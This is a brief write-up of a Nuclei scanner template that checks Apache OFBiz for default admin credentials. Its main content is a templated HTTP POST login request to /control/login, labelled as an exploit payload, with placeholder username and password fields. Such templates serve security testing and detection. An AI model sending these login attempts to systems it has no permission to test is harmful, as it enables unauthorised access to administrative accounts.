# Nuclei Template: Apache OfBiz Default Login
**Template ID:** ofbiz-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`ofbiz-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Apache OfBiz default admin credentials were discovered.

## Steps to reproduce / Exploit Payload
```http
POST /control/login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

USERNAME={{username}}&PASSWORD={{password}}&FTOKEN=&JavaScriptEnabled=Y
```

## References
- https://cwiki.apache.org/confluence/display/OFBIZ/Apache+OFBiz+Technical+Production+Setup+Guide
